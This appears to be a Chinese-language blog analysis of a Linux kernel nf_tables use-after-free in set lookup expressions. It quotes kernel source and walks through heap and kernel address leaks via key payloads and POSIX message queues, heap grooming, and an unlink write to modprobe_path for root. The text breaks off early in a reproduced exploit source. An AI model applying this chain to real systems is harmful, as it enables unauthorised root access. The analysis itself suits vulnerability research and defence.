&#123;\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);\t\t\treturn PTR_ERR(set);\t\t&#125;\t&#125; else &#123;\t\tif (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);\t\t\treturn -EEXIST;\t\t&#125;\t\tif (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)\t\t\treturn -EOPNOTSUPP;\t\treturn 0;\t&#125;\tif (!(info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE))\t\treturn -ENOENT;\tops = nft_select_set_ops(&amp;ctx, nla, &amp;desc, policy);\tif (IS_ERR(ops))\t\treturn PTR_ERR(ops);\tudlen = 0;\tif (nla[NFTA_SET_USERDATA])\t\tudlen = nla_len(nla[NFTA_SET_USERDATA]);\tsize = 0;\tif (ops-&gt;privsize != NULL)\t\tsize = ops-&gt;privsize(nla, &amp;desc);\talloc_size = sizeof(*set) + size + udlen;\tif (alloc_size &lt; size || alloc_size &gt; INT_MAX)\t\treturn -ENOMEM;\tset = kvzalloc(alloc_size, GFP_KERNEL);\tif (!set)\t\treturn -ENOMEM;\tname = nla_strdup(nla[NFTA_SET_NAME], GFP_KERNEL);\tif (!name) &#123;\t\terr = -ENOMEM;\t\tgoto err_set_name;\t&#125;\terr = nf_tables_set_alloc_name(&amp;ctx, set, name);\tkfree(name);\tif (err &lt; 0)\t\tgoto err_set_name;\tudata = NULL;\tif (udlen) &#123;\t\tudata = set-&gt;data + size;\t\tnla_memcpy(udata, nla[NFTA_SET_USERDATA], udlen);\t&#125;\tINIT_LIST_HEAD(&amp;set-&gt;bindings);\tINIT_LIST_HEAD(&amp;set-&gt;catchall_list);\tset-&gt;table = table;\twrite_pnet(&amp;set-&gt;net, net);\tset-&gt;ops = ops;\tset-&gt;ktype = ktype;\tset-&gt;klen = desc.klen;\tset-&gt;dtype = dtype;\tset-&gt;objtype = objtype;\tset-&gt;dlen = desc.dlen;\tset-&gt;flags = flags;\tset-&gt;size = desc.size;\tset-&gt;policy = policy;\tset-&gt;udlen = udlen;\tset-&gt;udata = udata;\tset-&gt;timeout = timeout;\tset-&gt;gc_int = gc_int;\tset-&gt;field_count = desc.field_count;\tfor (i = 0; i &lt; desc.field_count; i++)\t\tset-&gt;field_len[i] = desc.field_len[i];\terr = ops-&gt;init(set, &amp;desc, nla);\tif (err &lt; 0)\t\tgoto err_set_init;\tif (nla[NFTA_SET_EXPR]) &#123;\t\texpr = nft_set_elem_expr_alloc(&amp;ctx, set, nla[NFTA_SET_EXPR]);\t\tif (IS_ERR(expr)) &#123;\t\t\terr = PTR_ERR(expr);\t\t\tgoto err_set_expr_alloc;\t\t&#125;\t\tset-&gt;exprs[0] = expr;\t\tset-&gt;num_exprs++;\t&#125; else if (nla[NFTA_SET_EXPRESSIONS]) &#123;\t\tstruct nft_expr *expr;\t\tstruct nlattr *tmp;\t\tint left;\t\tif (!(flags &amp; NFT_SET_EXPR)) &#123;\t\t\terr = -EINVAL;\t\t\tgoto err_set_expr_alloc;\t\t&#125;\t\ti = 0;\t\tnla_for_each_nested (tmp, nla[NFTA_SET_EXPRESSIONS], left) &#123;\t\t\tif (i == NFT_SET_EXPR_MAX) &#123;\t\t\t\terr = -E2BIG;\t\t\t\tgoto err_set_expr_alloc;\t\t\t&#125;\t\t\tif (nla_type(tmp) != NFTA_LIST_ELEM) &#123;\t\t\t\terr = -EINVAL;\t\t\t\tgoto err_set_expr_alloc;\t\t\t&#125;\t\t\texpr = nft_set_elem_expr_alloc(&amp;ctx, set, tmp);\t\t\tif (IS_ERR(expr)) &#123;\t\t\t\terr = PTR_ERR(expr);\t\t\t\tgoto err_set_expr_alloc;\t\t\t&#125;\t\t\tset-&gt;exprs[i++] = expr;\t\t\tset-&gt;num_exprs++;\t\t&#125;\t&#125;\tset-&gt;handle = nf_tables_alloc_handle(table);\terr = nft_trans_set_add(&amp;ctx, NFT_MSG_NEWSET, set);\tif (err &lt; 0)\t\tgoto err_set_expr_alloc;\tlist_add_tail_rcu(&amp;set-&gt;list, &amp;table-&gt;sets);\ttable-&gt;use++;\treturn 0;err_set_expr_alloc:\tfor (i = 0; i &lt; set-&gt;num_exprs; i++)\t\tnft_expr_destroy(&amp;ctx, set-&gt;exprs[i]);\tops-&gt;destroy(set);err_set_init:\tkfree(set-&gt;name);err_set_name:\tkvfree(set);\treturn err;&#125;\n\n上半部分处理set的跟漏洞关系不大，主要关注下面生成expression的过程，这里使用了nft_set_elem_expr_alloc函数进行申请。\nstruct nft_expr *nft_set_elem_expr_alloc(const struct nft_ctx *ctx,\t\t\t\t\t const struct nft_set *set,\t\t\t\t\t const struct nlattr *attr)&#123;\tstruct nft_expr *expr;\tint err;e\texpr = nft_expr_init(ctx, attr);\tif (IS_ERR(expr))\t\treturn expr;\terr = -EOPNOTSUPP;\tif (!(expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))\t\tgoto err_set_elem_expr;\tif (expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_GC) &#123;\t\tif (set-&gt;flags &amp; NFT_SET_TIMEOUT)\t\t\tgoto err_set_elem_expr;\t\tif (!set-&gt;ops-&gt;gc_init)\t\t\tgoto err_set_elem_expr;\t\tset-&gt;ops-&gt;gc_init(set);\t&#125;\treturn expr;err_set_elem_expr:\tnft_expr_destroy(ctx, expr);\treturn ERR_PTR(err);&#125;\n\n在函数开头就调用了nft_expr_init进行初始化。\nstatic struct nft_expr *nft_expr_init(const struct nft_ctx *ctx,\t\t\t\t      const struct nlattr *nla)&#123;\tstruct nft_expr_info expr_info;\tstruct nft_expr *expr;\tstruct module *owner;\tint err;\terr = nf_tables_expr_parse(ctx, nla, &amp;expr_info);\tif (err &lt; 0)\t\tgoto err_expr_parse;\terr = -EOPNOTSUPP;\tif (!(expr_info.ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))\t\tgoto err_expr_stateful;\terr = -ENOMEM;\texpr = kzalloc(expr_info.ops-&gt;size, GFP_KERNEL);\tif (expr == NULL)\t\tgoto err_expr_stateful;\terr = nf_tables_newexpr(ctx, &amp;expr_info, expr);\tif (err &lt; 0)\t\tgoto err_expr_new;\treturn expr;err_expr_new:\tkfree(expr);err_expr_stateful:\towner = expr_info.ops-&gt;type-&gt;owner;\tif (expr_info.ops-&gt;type-&gt;release_ops)\t\texpr_info.ops-&gt;type-&gt;release_ops(expr_info.ops);\tmodule_put(owner);err_expr_parse:\treturn ERR_PTR(err);&#125;\n\n可以看到这里就出现了我们比较熟悉的两个函数了nf_tables_expr_parse，nf_tables_newexpr。\nstruct nft_expr &#123;\tconst struct nft_expr_ops\t*ops;\tunsigned char\t\t\tdata[]\t\t__attribute__((aligned(__alignof__(u64))));&#125;;static inline void *nft_expr_priv(const struct nft_expr *expr)&#123;\treturn (void *)expr-&gt;data;&#125;static int nft_lookup_init(const struct nft_ctx *ctx,\t\t\t   const struct nft_expr *expr,\t\t\t   const struct nlattr * const tb[])&#123;\tstruct nft_lookup *priv = nft_expr_priv(expr);\tu8 genmask = nft_genmask_next(ctx-&gt;net);\tstruct nft_set *set;\tu32 flags;\tint err;\tif (tb[NFTA_LOOKUP_SET] == NULL ||\t    tb[NFTA_LOOKUP_SREG] == NULL)\t\treturn -EINVAL;\tset = nft_set_lookup_global(ctx-&gt;net, ctx-&gt;table, tb[NFTA_LOOKUP_SET],\t\t\t\t    tb[NFTA_LOOKUP_SET_ID], genmask);\tif (IS_ERR(set))\t\treturn PTR_ERR(set);\terr = nft_parse_register_load(tb[NFTA_LOOKUP_SREG], &amp;priv-&gt;sreg,\t\t\t\t      set-&gt;klen);\tif (err &lt; 0)\t\treturn err;\tif (tb[NFTA_LOOKUP_FLAGS]) &#123;\t\tflags = ntohl(nla_get_be32(tb[NFTA_LOOKUP_FLAGS]));\t\tif (flags &amp; ~NFT_LOOKUP_F_INV)\t\t\treturn -EINVAL;\t\tif (flags &amp; NFT_LOOKUP_F_INV) &#123;\t\t\tif (set-&gt;flags &amp; NFT_SET_MAP)\t\t\t\treturn -EINVAL;\t\t\tpriv-&gt;invert = true;\t\t&#125;\t&#125;\tif (tb[NFTA_LOOKUP_DREG] != NULL) &#123;\t\tif (priv-&gt;invert)\t\t\treturn -EINVAL;\t\tif (!(set-&gt;flags &amp; NFT_SET_MAP))\t\t\treturn -EINVAL;\t\terr = nft_parse_register_store(ctx, tb[NFTA_LOOKUP_DREG],\t\t\t\t\t       &amp;priv-&gt;dreg, NULL, set-&gt;dtype,\t\t\t\t\t       set-&gt;dlen);\t\tif (err &lt; 0)\t\t\treturn err;\t&#125; else if (set-&gt;flags &amp; NFT_SET_MAP)\t\treturn -EINVAL;\tpriv-&gt;binding.flags = set-&gt;flags &amp; NFT_SET_MAP;\terr = nf_tables_bind_set(ctx, set, &amp;priv-&gt;binding);\tif (err &lt; 0)\t\treturn err;\tpriv-&gt;set = set;\treturn 0;&#125;\n\n按照上面的分析此时就该调用nft_lookup_init函数了，这里主要需要注意的是最后一步操作，就是将priv绑定到set上。\n  static inline void __list_add_rcu(struct list_head *new,\t\tstruct list_head *prev, struct list_head *next)&#123;\tif (!__list_add_valid(new, prev, next))\t\treturn;\tnew-&gt;next = next;\tnew-&gt;prev = prev;\trcu_assign_pointer(list_next_rcu(prev), new);\tnext-&gt;prev = new;&#125;static inline void list_add_tail_rcu(struct list_head *new,\t\t\t\t\tstruct list_head *head)&#123;\t__list_add_rcu(new, head-&gt;prev, head);&#125;struct nft_set_binding &#123;\tstruct list_head\t\tlist;\tconst struct nft_chain\t\t*chain;\tu32\t\t\t\tflags;&#125;;struct nft_lookup &#123;\tstruct nft_set\t\t\t*set;\tu8\t\t\t\tsreg;\tu8\t\t\t\tdreg;\tbool\t\t\t\tinvert;\tstruct nft_set_binding\t\tbinding;&#125;;int nf_tables_bind_set(const struct nft_ctx *ctx, struct nft_set *set,\t\t       struct nft_set_binding *binding)&#123;\tstruct nft_set_binding *i;\tstruct nft_set_iter iter;\tif (set-&gt;use == UINT_MAX)\t\treturn -EOVERFLOW;\tif (!list_empty(&amp;set-&gt;bindings) &amp;&amp; nft_set_is_anonymous(set))\t\treturn -EBUSY;\tif (binding-&gt;flags &amp; NFT_SET_MAP) &#123;\t\t/* If the set is already bound to the same chain all\t\t * jumps are already validated for that chain.\t\t */\t\tlist_for_each_entry (i, &amp;set-&gt;bindings, list) &#123;\t\t\tif (i-&gt;flags &amp; NFT_SET_MAP &amp;&amp;\t\t\t    i-&gt;chain == binding-&gt;chain)\t\t\t\tgoto bind;\t\t&#125;\t\titer.genmask = nft_genmask_next(ctx-&gt;net);\t\titer.skip = 0;\t\titer.count = 0;\t\titer.err = 0;\t\titer.fn = nf_tables_bind_check_setelem;\t\tset-&gt;ops-&gt;walk(ctx, set, &amp;iter);\t\tif (!iter.err)\t\t\titer.err = nft_set_catchall_bind_check(ctx, set);\t\tif (iter.err &lt; 0)\t\t\treturn iter.err;\t&#125;bind:\tbinding-&gt;chain = ctx-&gt;chain;\tlist_add_tail_rcu(&amp;binding-&gt;list, &amp;set-&gt;bindings);\tnft_set_trans_bind(ctx, set);\tset-&gt;use++;\treturn 0;&#125;\n\n回到nft_set_elem_expr_alloc函数中若是我们控制走向err_set_elem_expr分支即可销毁expr。\n当if (!(expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))满足是会进入到err_set_elem_expr分支中，正好我们使用的type中是不存在这个东西的。\nvoid nf_tables_destroy_set(const struct nft_ctx *ctx, struct nft_set *set)&#123;\tif (list_empty(&amp;set-&gt;bindings) &amp;&amp; nft_set_is_anonymous(set))\t\tnft_set_destroy(ctx, set);&#125;static void nft_lookup_destroy(const struct nft_ctx *ctx,\t\t\t       const struct nft_expr *expr)&#123;\tstruct nft_lookup *priv = nft_expr_priv(expr);\tnf_tables_destroy_set(ctx, priv-&gt;set);&#125;static void nf_tables_expr_destroy(const struct nft_ctx *ctx,\t\t\t\t   struct nft_expr *expr)&#123;\tconst struct nft_expr_type *type = expr-&gt;ops-&gt;type;\tif (expr-&gt;ops-&gt;destroy)\t\texpr-&gt;ops-&gt;destroy(ctx, expr);\tmodule_put(type-&gt;owner);&#125;void nft_expr_destroy(const struct nft_ctx *ctx, struct nft_expr *expr)&#123;\tnf_tables_expr_destroy(ctx, expr);\tkfree(expr);&#125;\n\n根据这里的调用关系可以看到，其实最终实现的就只是单单kfree了个expr，而并没有脱链之类的操作，那么此时就发生了UAF。\nstatic const struct nft_expr_ops nft_lookup_ops = &#123;\t.type\t\t= &amp;nft_lookup_type,\t.size\t\t= NFT_EXPR_SIZE(sizeof(struct nft_lookup)),\t.eval\t\t= nft_lookup_eval,\t.init\t\t= nft_lookup_init,\t.activate\t= nft_lookup_activate,\t.deactivate\t= nft_lookup_deactivate,\t.destroy\t= nft_lookup_destroy,\t.dump\t\t= nft_lookup_dump,\t.validate\t= nft_lookup_validate,\t.reduce\t\t= nft_lookup_reduce,&#125;;struct nft_expr_type nft_lookup_type __read_mostly = &#123;\t.name\t\t= &quot;lookup&quot;,\t.ops\t\t= &amp;nft_lookup_ops,\t.policy\t\t= nft_lookup_policy,\t.maxattr\t= NFTA_LOOKUP_MAX,\t.owner\t\t= THIS_MODULE,&#125;;\n\n然而lookup的expre的flag位恰好没有NFT_EXPR_STATEFUL标识位。\n漏洞利用泄漏堆地址其实上述漏洞存在很大的局限性，在触发到UAF之后，唯一能做到的一件事就是修改(struct nft_lookup *)(expr-&gt;data)-&gt;binding-&gt;next指针指向新生成的new_expr。\nexpr = kzalloc(expr_info.ops-&gt;size, GFP_KERNEL);在上一篇文章提到了内核内存隔离这一说，因为标识位的不同导致无法使用很多已有结构体。\nstruct user_key_payload &#123;\tstruct rcu_head\trcu;\t\t/* RCU destructor */\tunsigned short\tdatalen;\t/* length of this data */\tchar\t\tdata[] __aligned(__alignof__(u64)); /* actual data */&#125;;\n\n上面next指针的偏移正好为0x18而这里的data数组是用户可控，那么可以通过触发uaf之后泄漏出堆地址。\nint user_preparse(struct key_preparsed_payload *prep)&#123;\tstruct user_key_payload *upayload;\tsize_t datalen = prep-&gt;datalen;\tif (datalen &lt;= 0 || datalen &gt; 32767 || !prep-&gt;data)\t\treturn -EINVAL;\tupayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);\tif (!upayload)\t\treturn -ENOMEM;\t/* attach the data */\tprep-&gt;quotalen = datalen;\tprep-&gt;payload.data[0] = upayload;\tupayload-&gt;datalen = datalen;\tmemcpy(upayload-&gt;data, prep-&gt;data, datalen);\treturn 0;&#125;EXPORT_SYMBOL_GPL(user_preparse);\n\n并且可以注意到他的申请参数也为GFP_KERNEL。\n泄漏内核地址这里用到的是mqueue中的posix消息队列模块，该模块和msg_msg一样是IPC进程间通信的消息队列功能。\nstruct rb_node &#123;\tunsigned long  __rb_parent_color;\tstruct rb_node *rb_right;\tstruct rb_node *rb_left;&#125; __attribute__((aligned(sizeof(long))));struct posix_msg_tree_node &#123;\tstruct rb_node\t\trb_node;\tstruct list_head\tmsg_list;\tint\t\t\tpriority;&#125;;\n\n可以看到posix_msg_tree_node的next指针刚好落在了0x18这个位置。\nstatic int do_mq_timedsend(mqd_t mqdes, const char __user *u_msg_ptr,\t\tsize_t msg_len, unsigned int msg_prio,\t\tstruct timespec64 *ts)&#123;\tstruct fd f;\tstruct inode *inode;\tstruct ext_wait_queue wait;\tstruct ext_wait_queue *receiver;\tstruct msg_msg *msg_ptr;\tstruct mqueue_inode_info *info;\tktime_t expires, *timeout = NULL;\tstruct posix_msg_tree_node *new_leaf = NULL;\tint ret = 0;\tDEFINE_WAKE_Q(wake_q);  // ... ...  msg_ptr = load_msg(u_msg_ptr, msg_len);    // ... ...  \tif (!info-&gt;node_cache)\t\tnew_leaf = kmalloc(sizeof(*new_leaf), GFP_KERNEL);  spin_lock(&amp;info-&gt;lock);\tif (!info-&gt;node_cache &amp;&amp; new_leaf) &#123;\t\t/* Save our speculative allocation into the cache */\t\tINIT_LIST_HEAD(&amp;new_leaf-&gt;msg_list);\t\tinfo-&gt;node_cache = new_leaf;\t\tnew_leaf = NULL;\t&#125; else &#123;\t\tkfree(new_leaf);\t&#125;  if (info-&gt;attr.mq_curmsgs == info-&gt;attr.mq_maxmsg) &#123;    // ... ...  &#125; else &#123;    // ... ...    if (receiver) &#123;      // ... ...    &#125; else &#123;      // ... ...    ret = msg_insert(msg_ptr, info);    &#125;  &#125;  // ... ...&#125;SYSCALL_DEFINE5(mq_timedsend, mqd_t, mqdes, const char __user *, u_msg_ptr,\t\tsize_t, msg_len, unsigned int, msg_prio,\t\tconst struct __kernel_timespec __user *, u_abs_timeout)&#123;\tstruct timespec64 ts, *p = NULL;\tif (u_abs_timeout) &#123;\t\tint res = prepare_timeout(u_abs_timeout, &amp;ts);\t\tif (res)\t\t\treturn res;\t\tp = &amp;ts;\t&#125;\treturn do_mq_timedsend(mqdes, u_msg_ptr, msg_len, msg_prio, p);&#125;\n\n整体流程就是首先从用户态载入消息，然后创建对应的posix_msg_tree_node结构体，将结构体放入到info中，最后插入到消息队列中。可以看到在申请posix_msg_tree_node结构体时也是使用了GFP_KERNEL标识位。\nstatic int msg_insert(struct msg_msg *msg, struct mqueue_inode_info *info)&#123;\tstruct rb_node **p, *parent = NULL;\tstruct posix_msg_tree_node *leaf;\tbool rightmost = true;\tp = &amp;info-&gt;msg_tree.rb_node;\twhile (*p) &#123;\t\tparent = *p;\t\tleaf = rb_entry(parent, struct posix_msg_tree_node, rb_node);\t\tif (likely(leaf-&gt;priority == msg-&gt;m_type))\t\t\tgoto insert_msg;\t\telse if (msg-&gt;m_type &lt; leaf-&gt;priority) &#123;\t\t\tp = &amp;(*p)-&gt;rb_left;\t\t\trightmost = false;\t\t&#125; else\t\t\tp = &amp;(*p)-&gt;rb_right;\t&#125;\tif (info-&gt;node_cache) &#123;\t\tleaf = info-&gt;node_cache;\t\tinfo-&gt;node_cache = NULL;\t&#125; else &#123;\t\tleaf = kmalloc(sizeof(*leaf), GFP_ATOMIC);\t\tif (!leaf)\t\t\treturn -ENOMEM;\t\tINIT_LIST_HEAD(&amp;leaf-&gt;msg_list);\t&#125;\tleaf-&gt;priority = msg-&gt;m_type;\tif (rightmost)\t\tinfo-&gt;msg_tree_rightmost = &amp;leaf-&gt;rb_node;\trb_link_node(&amp;leaf-&gt;rb_node, parent, p);\trb_insert_color(&amp;leaf-&gt;rb_node, &amp;info-&gt;msg_tree);insert_msg:\tinfo-&gt;attr.mq_curmsgs++;\tinfo-&gt;qsize += msg-&gt;m_ts;\tlist_add_tail(&amp;msg-&gt;m_list, &amp;leaf-&gt;msg_list);\treturn 0;&#125;\n\n可以看到在最后是将消息添加到leaf中去了，并且next指针为0x18，如果出发了uaf覆盖的话就会达成以下效果\n\n那么接下来只需要读取消息即可达到泄漏的目的\nSYSCALL_DEFINE5(mq_timedreceive, mqd_t, mqdes, char __user *, u_msg_ptr,\t\tsize_t, msg_len, unsigned int __user *, u_msg_prio,\t\tconst struct __kernel_timespec __user *, u_abs_timeout)&#123;\tstruct timespec64 ts, *p = NULL;\tif (u_abs_timeout) &#123;\t\tint res = prepare_timeout(u_abs_timeout, &amp;ts);\t\tif (res)\t\t\treturn res;\t\tp = &amp;ts;\t&#125;\treturn do_mq_timedreceive(mqdes, u_msg_ptr, msg_len, u_msg_prio, p);&#125;\n\nstatic int do_mq_timedreceive(mqd_t mqdes, char __user *u_msg_ptr,\t\tsize_t msg_len, unsigned int __user *u_msg_prio,\t\tstruct timespec64 *ts)&#123;\tssize_t ret;\tstruct msg_msg *msg_ptr;\tstruct fd f;\tstruct inode *inode;\tstruct mqueue_inode_info *info;\tstruct ext_wait_queue wait;\tktime_t expires, *timeout = NULL;\tstruct posix_msg_tree_node *new_leaf = NULL;\tif (ts) &#123;\t\texpires = timespec64_to_ktime(*ts);\t\ttimeout = &amp;expires;\t&#125;\taudit_mq_sendrecv(mqdes, msg_len, 0, ts);\tf = fdget(mqdes);\tif (unlikely(!f.file)) &#123;\t\tret = -EBADF;\t\tgoto out;\t&#125;\tinode = file_inode(f.file);\tif (unlikely(f.file-&gt;f_op != &amp;mqueue_file_operations)) &#123;\t\tret = -EBADF;\t\tgoto out_fput;\t&#125;\tinfo = MQUEUE_I(inode);\taudit_file(f.file);\tif (unlikely(!(f.file-&gt;f_mode &amp; FMODE_READ))) &#123;\t\tret = -EBADF;\t\tgoto out_fput;\t&#125;\t/* checks if buffer is big enough */\tif (unlikely(msg_len &lt; info-&gt;attr.mq_msgsize)) &#123;\t\tret = -EMSGSIZE;\t\tgoto out_fput;\t&#125;\t/*\t * msg_insert really wants us to have a valid, spare node struct so\t * it doesn&#x27;t have to kmalloc a GFP_ATOMIC allocation, but it will\t * fall back to that if necessary.\t */\tif (!info-&gt;node_cache)\t\tnew_leaf = kmalloc(sizeof(*new_leaf), GFP_KERNEL);\tspin_lock(&amp;info-&gt;lock);\tif (!info-&gt;node_cache &amp;&amp; new_leaf) &#123;\t\t/* Save our speculative allocation into the cache */\t\tINIT_LIST_HEAD(&amp;new_leaf-&gt;msg_list);\t\tinfo-&gt;node_cache = new_leaf;\t&#125; else &#123;\t\tkfree(new_leaf);\t&#125;\tif (info-&gt;attr.mq_curmsgs == 0) &#123;\t\tif (f.file-&gt;f_flags &amp; O_NONBLOCK) &#123;\t\t\tspin_unlock(&amp;info-&gt;lock);\t\t\tret = -EAGAIN;\t\t&#125; else &#123;\t\t\twait.task = current;\t\t\t/* memory barrier not required, we hold info-&gt;lock */\t\t\tWRITE_ONCE(wait.state, STATE_NONE);\t\t\tret = wq_sleep(info, RECV, timeout, &amp;wait);\t\t\tmsg_ptr = wait.msg;\t\t&#125;\t&#125; else &#123;\t\tDEFINE_WAKE_Q(wake_q);\t\tmsg_ptr = msg_get(info);\t\tinode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime =\t\t\t\tcurrent_time(inode);\t\t/* There is now free space in queue. */\t\tpipelined_receive(&amp;wake_q, info);\t\tspin_unlock(&amp;info-&gt;lock);\t\twake_up_q(&amp;wake_q);\t\tret = 0;\t&#125;\tif (ret == 0) &#123;\t\tret = msg_ptr-&gt;m_ts;\t\tif ((u_msg_prio &amp;&amp; put_user(msg_ptr-&gt;m_type, u_msg_prio)) ||\t\t\tstore_msg(u_msg_ptr, msg_ptr, msg_ptr-&gt;m_ts)) &#123;\t\t\tret = -EFAULT;\t\t&#125;\t\tfree_msg(msg_ptr);\t&#125;out_fput:\tfdput(f);out:\treturn ret;&#125;\n\n首先拿到file_inode，接着通过msg_get拿到对应的msg\nstatic inline struct msg_msg *msg_get(struct mqueue_inode_info *info)&#123;\tstruct rb_node *parent = NULL;\tstruct posix_msg_tree_node *leaf;\tstruct msg_msg *msg;try_again:\t/*\t * During insert, low priorities go to the left and high to the\t * right.  On receive, we want the highest priorities first, so\t * walk all the way to the right.\t */\tparent = info-&gt;msg_tree_rightmost;\tif (!parent) &#123;\t\tif (info-&gt;attr.mq_curmsgs) &#123;\t\t\tpr_warn_once(&quot;Inconsistency in POSIX message queue, &quot;\t\t\t\t     &quot;no tree element, but supposedly messages &quot;\t\t\t\t     &quot;should exist!\\n&quot;);\t\t\tinfo-&gt;attr.mq_curmsgs = 0;\t\t&#125;\t\treturn NULL;\t&#125;\tleaf = rb_entry(parent, struct posix_msg_tree_node, rb_node);\tif (unlikely(list_empty(&amp;leaf-&gt;msg_list))) &#123;\t\tpr_warn_once(&quot;Inconsistency in POSIX message queue, &quot;\t\t\t     &quot;empty leaf node but we haven&#x27;t implemented &quot;\t\t\t     &quot;lazy leaf delete!\\n&quot;);\t\tmsg_tree_erase(leaf, info);\t\tgoto try_again;\t&#125; else &#123;\t\tmsg = list_first_entry(&amp;leaf-&gt;msg_list,\t\t\t\t       struct msg_msg, m_list);\t\tlist_del(&amp;msg-&gt;m_list);\t\tif (list_empty(&amp;leaf-&gt;msg_list)) &#123;\t\t\tmsg_tree_erase(leaf, info);\t\t&#125;\t&#125;\tinfo-&gt;attr.mq_curmsgs--;\tinfo-&gt;qsize -= msg-&gt;m_ts;\treturn msg;&#125;\n\n随后通过store_msg将消息发送到用户态，最后再free掉对应的msg结构体。\nvoid free_msg(struct msg_msg *msg)&#123;\tstruct msg_msgseg *seg;\tsecurity_msg_msg_free(msg);\tseg = msg-&gt;next;\tkfree(msg);\twhile (seg != NULL) &#123;\t\tstruct msg_msgseg *tmp = seg-&gt;next;\t\tcond_resched();\t\tkfree(seg);\t\tseg = tmp;\t&#125;&#125;\n\n在释放函数中可以看到在开头位置会释放掉security但是这个是不可控的，如果不为0大概率会造成kernel panic所以要确保为0。并且可以看到这里并没有像以前那样可以用MSG_COPY来解决，并且在copy_to_user函数中会检测读取内容是否超过了堆块大小所以最多读取0x10的内容，所以只能寻求新的方法。\nstruct callback_head &#123;\tstruct callback_head *next;\tvoid (*func)(struct callback_head *head);&#125; __attribute__((aligned(sizeof(void *))));#define rcu_head callback_head\n\n值得注意的是前面提到的user_key_payload结构体的前面0x10个字节其实是如上结构体，他的前八个字节默认为0，并且func是指向user_free_payload_rcu函数的，所以保证了security为0并且可以成功泄漏出内核地址。\n所以这里需要确保user_free_payload_rcu结构体紧贴posix_msg_tree_node结构体的next指针指向的位置，所以可以先用io_uring占位，在申请第二个expr之前释放掉，这是大概率就会挤在一起了，这时在进行堆喷user_free_payload_rcu即可实现。\n提权至此来看约束条件还是比较多的，并不能实现传统意义上的任意地址写，不过在以往的一篇文章中介绍过modprobe_path这一个内核全局变量。\n\n这一步的构造方式和上述其实类似，也是通过堆喷posix_msg_tree_node结构体再通过UAF使其指向一个object，不过最后其指向的object是会被free掉的，那么紧接着堆喷usr_key_payload结构体，那么此时一个msg_msg结构体被两个usr_key_payload结构体所裹挟了。\nstatic inline void __list_del(struct list_head * prev, struct list_head * next)&#123;\tnext-&gt;prev = prev;\tWRITE_ONCE(prev-&gt;next, next);&#125;static inline void __list_del_entry(struct list_head *entry)&#123;\tif (!__list_del_entry_valid(entry))\t\treturn;\t__list_del(entry-&gt;prev, entry-&gt;next);&#125;static inline void list_del(struct list_head *entry)&#123;\t__list_del_entry(entry);\tentry-&gt;next = LIST_POISON1;\tentry-&gt;prev = LIST_POISON2;&#125;\n\n在读取消息时会调用msg_get函数获取到msg_msg结构体，并且在获取的时候紧跟着的就是list_del从链表中删除掉，可以看到其中出现了对指针的指针赋值的操作，这个操作其实在用户态堆中的unlink的时候就已经接触过了，所以如果我们可以控制prev和next那么就可以实现不任意地址写不任意值了，具体要求肯定就是保证两个指针都是可写的。那么这里可以使用0xffff????2f706d74进行写modprobe_path位置，最终的效果就为/tmp/????xffxffprobe，这的????是前面泄漏出来的堆地址。\nexp这里exp就直接用他的了( 因为我也不熟悉该模块所以就算自己写也会和他的大差不差 )\n// gcc exp.c -o exp -l mnl -l nftnl -w#define _GNU_SOURCE#include &lt;arpa/inet.h&gt;#include &lt;sched.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;err.h&gt;#include &lt;libmnl/libmnl.h&gt;#include &lt;libnftnl/chain.h&gt;#include &lt;libnftnl/expr.h&gt;#include &lt;libnftnl/rule.h&gt;#include &lt;libnftnl/table.h&gt;#include &lt;libnftnl/set.h&gt;#include &lt;linux/netfilter.h&gt;#include &lt;linux/netfilter/nf_tables.h&gt;#include &lt;linux/netfilter/nfnetlink.h&gt;#include &lt;sched.h&gt;#include &lt;sys/types.h&gt;#include &lt;signal.h&gt;#include &lt;net/if.h&gt;#include &lt;asm/types.h&gt;#include &lt;linux/netlink.h&gt;#include &lt;linux/rtnetlink.h&gt;#include &lt;sys/socket.h&gt;#include &lt;linux/ethtool.h&gt;#include &lt;linux/sockios.h&gt;#include &lt;sys/xattr.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;assert.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdint.h&gt;#include &lt;syscall.h&gt;#include &lt;mqueue.h&gt;#include &lt;linux/io_uring.h&gt;#include &lt;linux/keyctl.h&gt;#include &lt;sys/shm.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#define MQUEUE_NUM 5#define INBOUND 0#define OUTBOUND 1#define DESC_MAX 0x800#define BUFFER 0x100#define NAMELEN 0x100#define ERROR_PREFIX &quot;err: &quot;#define KEY_DESC_MAX_SIZE 40#define PREFIX_BUF_LEN 16#define RCU_HEAD_LEN 16#define SPRAY_KEY_SIZE 50#define PHYSMAP_MASK 0xffffffff00000000#define SPRAY_SIZE 1000#define SPRAY_NB_ENTRIES 10uint64_t base_base;uint64_t heap_base;uint64_t modprobe_addr;enum nft_trans_phase &#123;        NFT_TRANS_PREPARE,        NFT_TRANS_ABORT,        NFT_TRANS_COMMIT,        NFT_TRANS_RELEASE&#125;;typedef struct &#123;        long mtype;        char mtext[1];&#125;msg;typedef struct &#123;    void *ll_next;    void *ll_prev;    long m_type;    size_t m_ts;    void *next;    void *security;&#125;msg_header;typedef struct&#123;  char name[BUFFER];&#125; Msg;typedef struct&#123;    char iface[16];    char name[16];    char ip[16];    char netmask[16];    uint8_t idx;    uint8_t type;    uint16_t proto;    uint16_t port;    uint8_t action;    char desc[DESC_MAX];&#125; user_rule_t;struct keyring_payload &#123;    uint8_t 